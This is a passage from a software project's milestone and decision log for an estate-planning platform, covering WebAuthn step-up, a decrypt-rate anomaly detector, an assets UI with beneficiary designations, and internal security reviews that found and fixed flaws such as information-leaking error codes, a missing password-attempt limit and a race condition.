into the 2026-08-12 escalation). `factor-routes.spec.ts` gained the
`ROUTE_STEPUP` gate class AND the assertion that makes it checked rather than
labelled, mutation-tested by stripping the guard.

**The ceremony codec is hand-rolled** (~140 lines, `apps/web/src/lib/webauthn.ts`)
on the node:crypto/clamd/SRP precedent: @simplewebauthn/browser would put a
third-party tree on the second-factor path to save mechanical base64url
conversion over a FIXED field list — and the fixed list is the honest shape,
because a generic walker would convert fields nobody thought about.
Browser-side failures (a closed sheet, a timeout) have their own local
vocabulary and never launder into platform copy.

**The step-up prompt's passkey path is SELF-CONTAINED**: the prompt discovers
the caller's passkeys itself, so all four prompt-and-retry callers gained the
option with zero changes, and a discovery failure means silence — TOTP is
never hostage to a nicety. The ceremony await sits under the same ownership
counter as everything else; Cancel during the platform sheet abandons the
attempt and a sheet that never settles cannot wedge the form (proven by a case
that resolves the sheet after Cancel and asserts nothing applied).

**Wire and error plumbing:** the ceremony payloads cross GraphQL as JSON with
the M12 typed-input rule OWNED in the schema comment (the edge validates
nothing about attestation by design — a second validator would be the PR3
wire-drift class); `WEBAUTHN_FAILED` is mapped BY TOKEN before status, because
identity answers 400 and 401 with one token and the 401 half collapsing into
UNAUTHENTICATED would forget a valid session over a refused ceremony (the M16
PR2b shape); the APQ manifest was regenerated (66 operations); failed
assertions finally write a ledger kind (`webauthn.assertion_failed`,
deliberately in no rate-bound set), correcting a 2026-08-10 decision-log claim
the code never satisfied.

**Also paid down:** the first index `webauthn_credentials` has ever had
(migration 011, the 005 shape), and §6m's reset question RE-DECLINED with the
reasoning recorded rather than re-argued.

#### PR6 as built — the security review (2026-08-13)

Seven file-scoped discovery lenses over the merged M17 machinery, then two
adversarial verifiers per deduped candidate on different angles (production
reachability; is-it-already-a-decision), both defaulting to refuted. **12 raw,
12 unique, 2 confirmed, 10 refuted.** Every confirmed finding re-proved BY
EXECUTION against the running stack before anything changed; every fix
mutation-tested by reverting it (7 mutations, all red). Full record in docs/03
§6p.

Both confirmed findings falsify a claim M17 made about itself — the eleventh
milestone running:

1. **The change-password route verified a password with no bound.** §6k's own
   framing ("routes that take a password from an UNAUTHENTICATED caller") is
   why: the route reads as authenticated, though the entire reason it asks for
   the current password is the stolen-session threat. Measured live —
   twenty-five wrong guesses, no refusal, account taken over on the
   twenty-sixth, while the same volume at login produced four
   `login.rate_limited`. Fixed with M16's two scopes, the per-SESSION half
   being the escape that could not port to login but ports here.
2. **PR5's own ledger correction was incomplete.** Two of four failing
   assertion branches stayed silent, including the foreign-credential probe —
   the class no browser produces by accident. Ten live probes, zero rows.

Two novel-but-unreachable candidates are RECORDED rather than fixed (a
crypto-shredded DEK 500 at email-change completion; clone detection not
revoking), both latent behind machinery that does not exist yet — the M14
precedent of writing down what arms later rather than fixing speculatively or
hiding it.

### M18 — The TB4 decrypt-rate baseline (approved 2026-08-13; shipped, reviewed)

The detection half of docs/03 §4 TB4's "per-principal decrypt-rate baselines
with hard circuit breakers" — the control the threat model calls the single
most important insider defence — shipped against the local stack, on the M8
take-over precedent: take the deliverable, shrink the M5 cloud half, revise
the sentences. Discovery falsified this document's own claim that the baseline
is structurally blocked behind the AWS spend. It is not: `crypto.field.decrypted`
is emitted FAIL-CLOSED by every Zone B service (plaintext is withheld if the
audit sink rejects — packages/crypto dek.ts), so the audit stream is a complete
record of released plaintext, and only the ENFORCEMENT half (suspending a KMS
grant) needs real IAM. Sharper than that: the 5-minute DEK cache means N
decrypts under a hot key are N audit events and ZERO KMS operations, so
KMS-side detection structurally cannot see read volume — the audit stream is
not a local stand-in for the "real" signal, it IS the signal, in the cloud too.

Three PRs: PR1 attribution + the debts it makes acute; PR2 the detector; PR3
the security review. The six settled design decisions (grain, signal,
mechanism, home, alert sink, out-of-scope) are recorded in the decision log
(2026-08-13).

**PR1 — attribution (shipped).**

1. `DECRYPT_FIELD_PREFIXES` in @estate/contracts: the first dotted token of
   every decrypt field name, mapped to its owning service — the AUDIT_ACTIONS
   shape, closing what was previously an unfenced naming convention. The audit
   envelope carries no producing-service field, so this prefix is the only
   attribution signal the detector will have. Fourteen prefixes across eight
   services; vault (no server decrypt path) and audit map nothing;
   `distributions` is registered although settlement is encrypt-only today, so
   a decrypt ever appearing under it attributes to settlement rather than to
   the unknown class. The fence (`packages/contracts/test/decrypt-field-prefixes.spec.ts`)
   scans every service's field-crypto files with a string-aware tokenizer and
   holds two directions — a registered token observed in the WRONG service's
   source is red (disjointness against source, not assertion), and a
   registered prefix NOT observed in its own service's source is red (dead
   registry data) — plus per-service anti-vacuity floors and the
   vault/audit-have-none rule. Six mutations confirmed red on the assertions
   that name them. Deliberately NOT policed at this layer: a literal whose
   token is registered nowhere (the first run found ~170 legitimate dotted
   literals from other vocabularies in the same files — identity's ledger
   kinds alone are 122 — and an exclusion list that size is the permanently
   red gate people learn to ignore). The unknown-prefix net is the detector's
   own reportable class plus PR2's zero-anomaly stack-e2e gate.
2. The one pre-existing attribution debt: documents' `getEvidenceContent` —
   the only operator-driven decrypt in the product — audited as `'user'`
   through ContentCipher's default, while its own docstring says the caller is
   by construction a settlement operator. It passes `actorType: 'operator'`
   now, pinned by a spec that also proves the owner path still audits as
   `'user'`; mutation-tested by reverting.
3. Settlement's phantom claim corrected: `admin.service.ts` said distribution
   amounts are "decrypted only on explicit read" — no such read route exists
   (the claim-without-mechanism rule; prose corrected, route deliberately NOT
   added).
4. Migration `002_decrypt_rate_index.sql` (audit cluster): partial index
   `(occurred_at, actor_id) WHERE action = 'crypto.field.decrypted'` on the
   partitioned parent, so the detector's windowed sweep stops being a
   sequential scan and every future partition inherits it. occurred_at leads
   because the sweep is a pure time-range over all principals — the brief's
   suggested (actor_id, occurred_at) order cannot serve that shape. The
   CONCURRENTLY-inexpressible hazard is recorded in the file (identity 005
   precedent); an int test pins the M13 pair (recorded-as-applied AND
   index-exists, on parent AND partition).
5. **Measured ceilings** (2026-08-13, against the running stack: a full stack
   e2e dev journey plus a deliberate burst driver — 20-contact estate, list ×3
   + every detail read; 10 profile reads; 10 document content reads; 5 assets
   with valuations, list ×5 + each read). Peak per PRINCIPAL per MINUTE, by
   prefix class; these are PR2's threshold inputs:

   | prefix class | actor class | measured peak/min | shape |
   |---|---|---|---|
   | `contact` | user | 160 | 3 lists (20×name) + 20 details (×5 fields) — M13's ~100/detail-page economics, confirmed |
   | `profile` | user | 50 | 10 reads × 5 non-null fields |
   | `asset` | user | 30 | 5 lists × 5 valuations + 5 single reads |
   | `doc` | user | 10 | audited content reads, 1 per read |
   | `notification_recipient` | service (nil-UUID sentinel) | 16 | e2e journey sends |
   | `mfa_methods` | user | 2 | TOTP verify + step-up |
   | `assistant_message` | user | 2 | conversation reads |
   | `users`, `asset_event`, `plaid_item`, `account`, `assistant_tool_call`, `distributions` | — | 0 | not exercised by the journey / encrypt-only |

   Ordinary (non-burst) journey users peaked at 4/min. The whole 516-decrypt
   dataset ingested through the real consumer into the verified chain; the
   e2e's chain assertions stayed green over it.

**PR2 — the detector (shipped).** `DecryptRateDetector` inside
apps/services/audit: a windowed GROUP BY over the 002 index on the detector's
OWN Postgres session (never the ingestor's serialized chain connection),
evaluated by a pure function against `decrypt-rate-bounds.ts` — reviewed
constants set from PR1's measured table, with everything outside the table
bound 0 (`unknown_prefix` / `unmodeled_principal` / `encrypt_only`: a read
path nobody reviewed is itself the anomaly). Emits
`crypto.decrypt_rate.exceeded` through the service's FIRST Kafka producer via
the sanctioned AuditEmitter path onto its own topic, so the anomaly rides the
verified chain; episode dedup (emit on entry, silent while sustained, re-arm
on clear; restart or failed-emit duplicates fail in the EXTRA-event
direction). Started only from main.ts — suites construct classes directly, so
the timer structurally cannot run under jest; faults terminate in their own
catch + one log line, never the fatal path (advisory loss degrades alerting,
not ingest). The stack e2e gate pairs a positive control with the
false-positive assertion — a deliberate 101-step-up burst must produce
exactly its own `mfa_methods_user` anomaly and every anomaly in the store
must name that deliberate bound (a bare zero-assertion is vacuously green
over a dead detector, the M8 dead-consumer shape); counts moved 25/4→26/4
(dev, both workflow twins) and 16/13→16/14 (production). Docs revised as
owed: docs/03 §4 TB4 + §5.3 (the KMS-centric framing corrected — KMS cannot
see read volume through the DEK cache), new §6q, docs/05's
"cannot test anomaly detection" split into detection-local/response-cloud,
and the escalation list above shrunk by the detection half (the M8
take-over precedent).

**PR3 — the security review (shipped).** Six file-scoped discovery lenses
over the merged range, each in its own detached worktree pinned to the
reviewed commit, then TWO adversarial verifiers per deduped finding on
different angles (production reachability; is-it-already-a-documented-
decision), both defaulting to refuted. **22 raw candidates, 11 unique, 12
verifier verdicts, no agents lost.** Every confirmed finding re-proved BY
EXECUTION before a line changed, and every fix mutation-tested by reverting
it. TWELFTH milestone running where every confirmed finding sits in
machinery the milestone introduced, and most falsify a claim it made about
itself.

Four defects fixed:

1. **The "never a lost one" promise was false twice over.** The
   reconciliation that ends episodes ran AFTER the emit loop inside one try,
   so a single failed emit skipped it — a principal whose episode had
   cleared stayed marked announced, and its NEXT genuine episode was
   swallowed as a duplicate. Reproduced against the real detector (`[A, B]`
   where `[A, B, A]` was owed). The same shared try meant one unemittable
   breach cancelled its neighbours. Fixed per-emit, with the reconciliation
   moved ahead of anything that can fail — and the harness then showed the
   catch is the load-bearing half while the ordering is the belt, which is
   now written in the code instead of assumed.
2. **The advisory detector could kill ingest.** Neither pg client had an
   `error` listener, and node-postgres emits one on connection-level death
   (failover, an idle reaper, `pg_terminate_backend` — reproduced against a
   real cluster: uncaught, process gone, no fatal line). So the detector's
   mostly-idle session dying would have taken down the paging signal itself.
   `DetectorConnection` now absorbs, discards and reconnects — a listener
   alone would have traded the crash for permanent silence, since a pg
   Client never reconnects — connects lazily so boot is not load-bearing on
   an advisory component, and carries a query timeout so a black-holed
   socket faults instead of latching the re-entrancy guard for hours. The
   INGEST connection keeps the opposite posture and now dies through the
   service's own fatal path.
3. **Every projection rebuild fired the loudest alarm in the table.** The
   rebuild has TWO sentinel decrypt sites; only the ledger replay was
   modelled, so the live-view diff (`asset.<id>.<col>`) resolved to
   `unmodeled_principal`/0 and breached at count 1 on any valued estate —
   a reviewed path raising the "read path nobody reviewed" alarm, which is
   how an alarm stops being read. Now its own bound row.
4. **Two notions of "a principal" in one detector.** The sweep groups by
   `actor_type` while bounds key on the principal CLASS, so the sentinel's
   two actor types arrived as separate rows that were never merged — each
   under the bound while their sum exceeded it. Merged onto the bounds'
   grain before evaluation.

Also corrected: three sentences the milestone had falsified (the bounds
file's derivation "formula" that two of its own rows do not follow; the
`mfa_methods` note claiming the M16 step-up caps limit it transitively,
which this milestone's own 101-step-up burst disproves; the gate's "the
smallest bound", which is two rows wrong), and the e2e gate itself, which
asserted only the bound NAME over ALL rows for all time — blind to a
journey-caused anomaly in the same class, and permanently red once any
by-design alarm exists. It now asserts bound AND principal, scoped to the
suite's own run.

Recorded rather than fixed, in docs/03 §6q: the window's dependence on
producer-authored `occurred_at` (ingest lag or clock skew silently drops
counts; a far-future timestamp pins an episode), the emit-outage-longer-
than-the-window loss, the in-process-compromise boundary on
"a complete record of released plaintext", and the production-profile
coverage gap.

### M19 — The assets surface (approved 2026-08-13; complete 2026-08-13)

The runner-up of the 2026-08-12 selection, now chosen. The assets service is
the OLDEST domain service in the repo (M3), and M19 closes its zero-callers
gap the way M13 closed profile's: **order is the point** — the shipped service
was adversarially read before any UI was designed, and PR1 hardens what that
read found before PR2 puts a surface on it.

**Discovery corrected the selection sweep in both directions.** The sweep's
"`CreateAssetInput` carries no `inTrust`" was true of the BFF's GraphQL input
and FALSE of the service: `CreateAssetSchema` has accepted `inTrust`,
`fundingStatus`, `ownershipPct`, `costBasis`, `location`, `notes` and the
valuation triple since M3, and the sweep's route list missed
`PATCH /v1/assets/:assetId` entirely — full edit semantics (null clears,
absent leaves unchanged: the M13 profile-SSN rule, already right in M3-era
code). So the milestone needs NO service DDL and no new event types; the gap
is 13 routes against a BFF client with three methods, an `Asset` GraphQL type
with 8 of 13 fields, one `createAsset` mutation taking five flat args, and no
`[assetId]` route in the web app.

**What the pre-read found (PR1's payload):**

1. **`GET /v1/estates/:ownerUserId/assets` had never executed — anywhere.**
   The M7 PR2 executor-inventory route (docs/03 §5.1 control 5, the first
   staged grant) had zero product callers, zero e2e references, and zero
   int-spec coverage: an entire authorization path — settlement staged-grant
   check, uniform 403, `asset.estate.viewed` audit — that had never once run.
   PR1 gives it its first tests at both layers (unit over a controllable
   `SettlementStageAuthority` double; int against real Postgres asserting the
   executor-attributed decrypts, the `onBehalfOf` audit event, and that the
   refused path asks settlement the exact staged question on the caller's own
   bearer). The seam's OTHER side was already proven — settlement's
   stage-access authority in its own suites, the client against a mocked
   transport — so the int layer now covers the seam from both ends. A
   full-stack executor journey is deliberately absent: the stack cannot lapse
   a real 5..60-day waiting period, and the executor surface is its own
   milestone (the fence records the route as exempt for exactly that reason).
2. **The 404-vs-403 oracle was live on every asset-scoped path.** Cedar's
   deny threw a generic 403 while a missing row threw 404, so a cross-owner
   probe on getAsset/getHistory/getBeneficiaries or any command distinguished
   "exists, not yours" from "does not exist". Closed service-side
   (`assertCanOrNotFound`): a deny now answers the byte-identical missing-row
   404, the M10 assistant-PEP rule and the M13 profile predicate applied to
   the third service. The executor route's 403 deliberately stays — its param
   is an owner id the caller already knows, not a guessable resource id — and
   documents' own 404-oracle remains open as the M4 review recorded it.
3. **The owner list decrypted FOUR ciphertext fields per row** (est_value +
   cost_basis + location + notes) — 80 audited `crypto.field.decrypted`
   events for a 20-asset list that renders none of the last three. The list
   is now `AssetSummaryDto` (deliberately an explicit interface, not
   `Omit<AssetDto,…>`, so a field added to the full DTO cannot join the list
   wire shape silently) and decrypts EXACTLY `est_value` — one decrypt per
   row, proven at both layers by decrypt-audit assertions. `getAsset` keeps
   the full DTO; the executor inventory keeps full DTOs too, because it is
   the executor's ONLY read surface (no executor detail route exists) and
   §5.1's inventory rung exists so an executor can FIND assets. Verified
   consumers unaffected: the BFF's list schema never read the dropped fields,
   and the assistant's client strips them by design.
4. Minor: `getHistory` resolved the owner's DEK once per event; hoisted to
   once per request (pinned by a call-count case).

**The route↔consumer fence** (`packages/auth-guard/test/route-consumers.spec.ts`)
ships repo-wide in PR1, because the motivating cases sit OUTSIDE assets:
zero-callers is the repo's most-repeated defect class (M4 legal hold, M6
`wrapped_private_key`, M7's executor read above, settlement's 25
operator/reporter routes) and a fence scoped to one service would have missed
every one of them. Design, from the established precedents:

- **Derived, never listed** (the credential-graph technique): every
  controller route in `apps/services/*` is scanned out of comment-stripped
  source; routes behind a credential-graph guard CLASS are excluded, because
  the graph's `opens` rule already fences those — one fence per fact. The
  guard classification reads class-level `@UseGuards` only, matching how
  every internal controller is written; a handler-level credential guard
  would surface as a route DEMANDING a consumer entry, the failure direction
  that asks a human rather than hiding a route.
- **`ROUTE_CONSUMERS` is declared data, checked BOTH directions** (the
  declared-importers shape): every non-internal route needs exactly one
  entry; a stale entry (route gone) is red; every consumer entry names a
  file that must EXIST and CONTAIN a URL template addressing the route
  (interpolations collapsed to wildcards, matched segment-wise — which is
  how `/v1/analysis/${name}` covers four static analysis routes); every
  exemption carries a substantive grouped reason. Vault routes are consumed
  through the M15 edge, so `/api/…` templates are matched under the edge's
  rewrites and a dedicated case asserts each rewrite pair exists in
  `server.ts` source — a rewritten match is never a free-text claim.
- **Stated limits:** matching is PATH-based (two methods sharing a path are
  covered by one literal — parsing per-call transport options is a different
  fence), and e2e/int suites deliberately do NOT count as consumers, since a
  route only tests can reach is exactly what the fence exists to surface.
- **Mutation-tested six ways**, each red on the assertion that names it: a
  new undeclared route; a registry entry pointing at a file that does not
  address its route; a phantom consumer file; a deleted route leaving a
  stale entry; an internal controller losing its credential guard (the
  route floods into the fence demanding an entry — fail-safe); and a
  consumer literal renamed out from under its entry.

**The fence's first run found a finding beyond assets:** M17 shipped six
account-recovery/address-change routes (`POST /v1/auth/password`, the two
reset routes, the three email-change routes) with NO product consumer — the
milestone that closed "identity has no password reset" left the ceremonies
unreachable from the product. Recorded as `EXEMPT_RECOVERY_SURFACE` with the
pending frontend slice named; the settlement reporter/operator split, the
Plaid UI deferral, and the external webhook each carry their own reasoned
exemption group. Assets' own write surface is exempt as "pending M19
PR2/PR3", and those PRs flip the exemptions to consumer entries in the same
change as the clients — the M9 PR2 holders-flip pattern, so the milestone's
story is told in the fence's diff.

**PR2 (shipped) — the read+write surface.** The service change is
retired-asset visibility alone (`status`/`retiredAt` on both DTOs, `getAsset`
serves retired records, `?includeRetired` on the list — commands still
refuse); everything else is BFF/web. The BFF client grew from three methods
to nine; the GraphQL surface keeps TWO asset shapes on purpose — the LIST
type structurally cannot carry `costBasis`/`location`/`notes`, because a
nullable shared type would make "the list does not carry notes"
indistinguishable from "this asset has no notes" (the M11 rule applied at
the type level). `createAsset` switched from five flat args to a real
`CreateAssetInput`; four command mutations thread `expectedVersion` →
`If-Match` (a stale one is `VERSION_CONFLICT`, and the UI's only remedy is
re-read — proven by a never-auto-retries pin) and browser-minted
`clientEventId` idempotency keys (`command-id.ts`: one id per PAYLOAD, held
across retries of the same payload, regenerated the moment the payload
changes — reusing an id across an edit would answer the OLD command's ack
while the edit silently vanished). NULL-vs-ABSENT is kept apart end to end
(GraphQL coerced args → JSON.stringify → the service's null-clears), pinned
by wire-level assertions at all three layers and mutation-tested six ways.
The AssetsPanel's pre-existing M11 shape-guard gap was fixed and pinned;
history is loaded strictly ON DEMAND and dropped back to idle after any
command. (CORRECTED BY THE PR4 REVIEW: "after any command" was true only of
the commands this panel issues ITSELF. PR3's designation ceremony bumps the
version through a CHILD component, and that path did not clear history — so
a designation left a stale history list on screen beside a fresh version.
`onVersionBumped` clears it now, which is what makes the sentence true.)
APQ manifest regenerated; both BFF hand-copies updated (the
`assets.spec.ts` copy gained the hazard note it lacked); the fence's six
"pending M19 PR2" exemptions flipped to verified consumers in the same
change as the client.

**Deliberately NO stack-e2e additions in PR2** (counts unchanged in both
workflow twins): the service behavior is int-proven, the BFF layer has its
own resolver suites, and the UI was proven by DRIVING THE REAL BROWSER
against freshly rebuilt images — create with full details → detail → edit
(trust flip + an explicit notes CLEAR that removed `notes_ct` at the
database while `location_ct` survived untouched) → valuation ($900k, header
re-read live) → on-demand history (three entries, "notes cleared · marked
in trust" legible in the ledger) → retire (record readable, every action
form gone) → the list's Show-retired toggle. The journey's decrypt budget,
measured in the real audit chain: `asset_list` = 2 (ONE decrypt per row —
PR1's narrowing live), `asset_read` = 13 (4 per detail load, 3 once notes
were cleared), `asset_history` = 3 (one per event, once), `net_worth` = 1.
`decrypt-rate-bounds.ts` recalibrated by this commit per docs/03 §6q: the
provisional `asset_event/user` row has its first real measurement (3/min)
and the `asset/user` note now describes the narrowed arithmetic. The drive
also caught a display incoherence no unit test had: with Show retired on,
the trust card COUNTED a retired in-trust asset beside a server value that
correctly excluded it — the count is live-only now, pinned.

**PR3 (shipped) — the beneficiary-designation ceremony.** The service
change is two lines with one lesson each. The remove route finally passes
`eventId`: `RemoveBeneficiarySchema` has accepted it since M3 and the
controller never bound the query parameter — the zero-callers defect in
miniature, an idempotency key that existed at every layer except the one
that connects them, found by wiring its first consumer. And `runCommand`
gained an idempotent-replay pre-check (`findByEventId` before the
transaction, answering the original command's ack with `replayed: true`),
because the idempotency the unique index promises was UNREACHABLE for any
command whose precondition examines state the first execution changed: a
retried remove re-ran `softRemove`'s designation-exists precondition against
the world its own first execution had altered and 404'd — the retry of a
successful command reported that the command had never been possible. The
index stays as the race backstop for two concurrent firsts; the pre-check
serves the sequential retry, which is the case retries actually are.

**The BFF is the only layer that sees both clusters, and PR3 is where that
stops being trivia.** Designate refuses (`INVALID_REQUEST`) a contactId the
owner does not hold — docs/02 §8 forbids a cross-cluster FK and assets holds
no profile credential, so without this check a mistyped or forged id would
mint a designation dangling FROM BIRTH, indistinguishable from one whose
contact was deleted later. Remove is DELIBERATELY unchecked, and the
asymmetry is the point: a designation whose contact is gone must stay
removable, or the dangling row is permanent (pinned by a mutation that ADDS
the check to remove and goes red). The read composes contact names ONLY when
designations exist — every name is one audited `crypto.field.decrypted`, so
a zero-designation asset's beneficiary read costs zero decrypts — and a
dangling contactId renders as `name: null`, never dropped, because a
designation directing value at someone is not a row to hide when its label
fails. `share_sum_exceeded` got its own wire code mapped BEFORE the generic
422: it is the one refusal fixed by choosing a different number, and folding
it into "invalid request" would tell the user to re-check fields that are
fine.

**The web ceremony reuses the one StepUpPrompt, and the retry binding is a
discriminated union carrying the refused action's own arguments** — the M13
review's worst defect (a shared handler running a different action than the
one refused) has no shape to reoccur in, because the pending state carries
`{kind, contactId, designation, sharePct}` and the retry dispatches on it
rather than on whatever the form now says. The picker form HIDES while the
ceremony is up: the first version showed two "Cancel" buttons at once — the
picker's and the prompt's, the M15 identical-label ambiguity — caught by
this PR's own test before it shipped. Contacts load lazily (picker open
only), the ack's `version` flows up through `onVersionBumped` so no re-read
(and no decrypt) is spent on a number the ack already carries, retired
assets render the section read-only, and the copy carries both truths: a
designation is not access, and beneficiary visibility does not exist yet.
Readiness findings about a specific asset now deep-link to
`/assets/[id]` — the incoherence this milestone exists to close, closed
literally.

**Deliberately NO stack-e2e additions in PR3** (counts unchanged in both
workflow twins): the stack e2e has driven designate-through-real-step-up at
the service layer since the M3 era (`stack.e2e.spec.ts`), the BFF layer has
its own resolver suites including the membership refusal, and the UI was
proven by driving the real browser. Seven mutations, all caught — with one
harness lesson re-learned: the added-membership-check-on-remove mutation
first "passed" as a compile error (`Tests: 0 total`), which is an unfaithful
mutation and not a caught one; rewritten as a compilable variant and caught
behaviorally.

**PR3's pre-push adversarial review** (six file-scoped discovery lenses —
idempotency, authz/disclosure, the ceremony, wire drift, decrypt budget, and
a claims-extraction lens — each in its OWN detached worktree pinned to the
reviewed commit, then two refute-by-default verifiers per deduped candidate
on different angles; 11 raw, 6 unique, 3 confirmed by both verifiers, 3
split). Run BEFORE the PR opened rather than after, because the findings
were in machinery the PR introduced and a fix round is cheaper than a
follow-up. Every confirmed finding was RE-PROVED BY EXECUTION against real
Postgres before a line changed, and every fix mutation-tested by reverting
it from a saved copy.

**The load-bearing one falsified the pre-check's own comment.** The replay
fast path reads on the POOL, outside the transaction, so a retry racing its
still-in-flight original sees nothing, serializes behind `lockById FOR
UPDATE`, and then — after the original commits — dies at the If-Match check
(409, the product path: `expectedVersion` is non-nullable on the mutation)
or at `softRemove`'s already-removed precondition (404). Neither path
reaches the append, so the unique-index "backstop" the comment credited is
structurally unreachable for a remove race: a COMMITTED command answered as
impossible, which is the exact defect the pre-check was added to fix, in the
window (a slow original) where timeout-driven retries actually happen.
Measured at **404** before the fix. Closed by RESTATING the predicate under
the row lock — the M7 read-then-restate shape — where the retry's fresh
READ COMMITTED snapshot sees the committed event; the pool read stays as the
fast path for the common sequential retry, and the catch's remit narrows to
create races, which take no row lock. The int case drives two real
transactions and polls `pg_stat_activity` to confirm the retry is genuinely
lock-blocked before letting the original commit (poll + deadline, never a
bare sleep).

**And the pre-check had opened an event-existence oracle ahead of PR1's own
uniform 404.** Running before `lockById` and `assertCanOrNotFound`, it
answered 409 for an eventId naming ANY user's ledger event and 404 for an
unknown one — measured, 409 vs 404 — so the milestone that closed the
404-vs-403 oracle re-opened a narrower one two PRs later. The lookup is
ACTOR-SCOPED now: a foreign id behaves exactly like an unknown one and dies
at the uniform 404, pinned by a byte-identical-response probe.

**Two claims were corrected rather than defended.** `getAsset`'s "commands
against a retired asset still 404" gained its one deliberate exception (a
replay of a command that committed before retirement answers its original
ack — a retry must never report a committed command as impossible), now
pinned by a test that also asserts a FRESH command against the same retired
asset still 404s. And the membership check's comment cited a docs/03 record
that did not exist when it was written; docs/03 §6r now exists and the
comment says plainly that the check is edge hygiene rather than a boundary.

**A display defect the ceremony shared with no test:** `100 - total.sharePct`
is arithmetic on a float, so `2.058` rendered "97.94200000000001%
unassigned" — measured across the legal 3-decimal domain, **32,448 of
~100,000 valid shares** print noise. `lib/percent.ts` formats at the wire's
own precision (`PctSchema` admits 3dp, so rounding there can never hide a
digit the server sent) — the `formatMoney` rule arriving for the product's
other numeric type, and applied to echoed values too so the next computed
one cannot skip it by looking like the rest.

**Two split verdicts, kept as refusals with the reason recorded.** The
client's share validation is deliberately LOOSER than `PctSchema` (the M12
upload-client rule: never a client-side second opinion on a server-side
gate; the cost is a generic refusal message, which is the trade that rule
already accepts). And the step-up retry loop's repeated membership checks
spend contact-name decrypts during the propagation window — bounded, in the
owner's own trail, serving the retry contract that makes the prompt honest;
recorded in docs/03 §6r rather than re-engineered, since every alternative
either duplicates the freshness gate at the edge or adds a
client-controllable skip to the check. A third, refuted as a security
finding, was fixed anyway because the CLAIM was false: a test comment said
the read-only view "must never spend" contact decrypts, when a
designation-bearing asset spends one per designated row by design — what the
test actually pins is that it never fetches the whole contact book.

**PR3 was proven by DRIVING THE REAL BROWSER** against images rebuilt from
the reviewed commit (containers verified on the new image ids, not the
orchestrator's word). Register → sign in → TOTP enrollment → a contact →
an asset → the ceremony: the step-up prompt appeared with its
designate-specific wording, the picker form HIDDEN behind it (exactly ONE
"Cancel" in the DOM, `Share %` gone — the M15 identical-label rule holding
live), a genuine TOTP code elevated the session, the retry applied, and the
designation landed in the ledger and the projection. The share it rendered
was **`2.058% designated (97.942% unassigned)`** — the precise value that
printed `97.94200000000001` before the review's formatter fix. Then the
share-sum refusal fired live with its own copy ("Those shares would add
past 100%…") and appended NOTHING to the ledger; a designated contact was
deleted from /people (profile permits it — a designation is not a role, so
`contact_in_use` does not fire) and the designation rendered as "No longer
in your contacts" with its share, its chip, and a working Remove, which
removed it with no membership question asked — the asymmetry, live. Finally
the readiness surface produced an asset-subject finding ("Shore Road
cottage names beneficiaries AND sits in your trust") and CLICKING IT landed
on that asset's own page: the M10 incoherence closed end to end, in a
browser. Every event is in the append-only ledger and the fully chained
audit trail (`asset.beneficiary.designated` ×2, `.removed`, `asset.created`,
`asset.updated`), and the ceremony's decrypt budget was measured in the real
chain — five `contact.name` decrypts, attributed per event in docs/03 §6r.

#### PR4 as built — the security review (2026-08-13)

Seven file-scoped discovery lenses over the merged M19 range — **never a diff
range**, the M13 rule — each in its OWN worktree pinned with
`git checkout --detach <sha>` (the 2026-08-12 rule; an isolated worktree is
created at MAIN, so an unpinned agent reads code the milestone never touched).
Then TWO adversarial verifiers per deduped candidate on different angles,
production reachability and is-it-already-a-documented-decision, both
defaulting to refuted. **31 agents, 0 errors** — 20 raw, 20 unique, 12
confirmed, 8 dropped under the fan-out cap and LOGGED BY NAME, then
hand-verified (all LOW, and all real: each was fixed).

**THIRTEENTH milestone running where every confirmed finding sits in machinery
the milestone introduced — with one exception, and the exception is where the
review earned its keep.** Both HIGH findings were re-proved BY EXECUTION
against the running stack before a line of code changed.

**(1) RETIREMENT — THE ONE IRREVERSIBLE VERB — WAS NOT STEP-UP GATED.** Every
other command on this service APPENDS a correction: an edit is a new event, a
valuation is a new event, even a removed designation leaves its history. Retire
is the one that ends an asset's life, and docs/01 §5 names deletion requests in
its step-up list — assets' own sibling route for beneficiary changes has
complied since M3. Nothing revisited it, and M19 PR2 then put a Retire button
in front of it, which is what turned a dormant gap into a live one: a stolen
bearer could retire an estate's assets one by one with no second factor. The
gate is `StepUpGuard` on the controller. What ships WITH it is the part that
generalises — `apps/services/assets/test/route-gates.spec.ts` declares every
route's gate class as DATA with a `because` reason per row, DISCOVERS the real
routes from Nest's runtime metadata (`__guards__`, `path`, `method`) rather
than from decorator text, and asserts bidirectionally with anti-vacuity floors.
Anchoring on what the RUNTIME reads is the 2026-08-12 lesson: a fence keyed on
an identifier a caller chose can be renamed into invisibility.

**(2) A CROSS-USER EVENT-EXISTENCE ORACLE.** M3's idempotency index
`ux_asset_events_event_id` was GLOBALLY unique, and `findByEventId` looked up
an event id with no owner predicate — so submitting somebody else's `eventId`
answered 409 while an unused one answered 201. Client-generated ids are the
whole point of the design (a retry must be a no-op), so an attacker who
observes one id — a log, a shared screen, a proxy — learns whether it exists,
and a 409 on a random id is a probe that says "this platform holds an event by
that name". Measured live before the fix: 201 for the owner, 409 for a
stranger's replay, 201 for an unused id. **Fixed by SCOPING rather than by
catching**: migration `002_event_id_per_user.sql` replaces the index with
`(user_id, event_id)`, and `findOwnByEventId` carries the owner predicate — a
foreign id is now indistinguishable from an unused one at both layers. The
migration needs NO pre-flight (it WIDENS what is permitted, so no existing row
can violate it, which is the opposite of `002_dek_unique_active`'s situation
and is why that rule does not apply here). The pre-`002` constraint name is
deliberately NOT also accepted by the conflict mapper: a database that has not
run the migration must fail loudly rather than quietly serve the old oracle.

**THE VERSION READ WAS TWO SNAPSHOTS, AND THE ORDER DECIDED WHICH WAY IT
FAILED.** `getAsset`/`listAssets`/`listEstateAssets` read the projection row
and the latest ledger seq in SEPARATE pool queries — separate snapshots — and
read the ROW first. A command committing between them returned the OLD state
paired with the NEW version, so the caller's next `If-Match` passed against
state it had never seen: a lost update, silent. Reversed, the same race returns
the new state with the old version, and the write is refused with a spurious
409 the UI already knows how to handle (re-read). **The order IS the control**,
and it is now pinned by a test that commits an update from inside
`ledger.latestSeq`. `latestSeqByAssets` became `latestSeqByUser` so a list can
read versions before it knows which rows it has.

**Three more in the service.** A share-sum CHECK violation (the ledger's one
CONSTRAINT TRIGGER) reached the caller as a 500 — the app-level check catches
the ordinary case, so only a race reaches the trigger, which is exactly when a
500 is least deserved; it maps to 422 `share_sum_exceeded` now, pinned by a
unit case that makes the repo double raise the real Postgres error shape and
says precisely that it proves the MAPPING and not the trigger. The executor
inventory emitted its `estate.viewed` audit event AFTER decrypting the estate,
so a failure mid-loop released plaintext with no record of the read — it is
emitted BEFORE the loop now, carrying the row count. And the assistant's
assets-client docstring still claimed `costBasis`/`location`/`notes` "are on
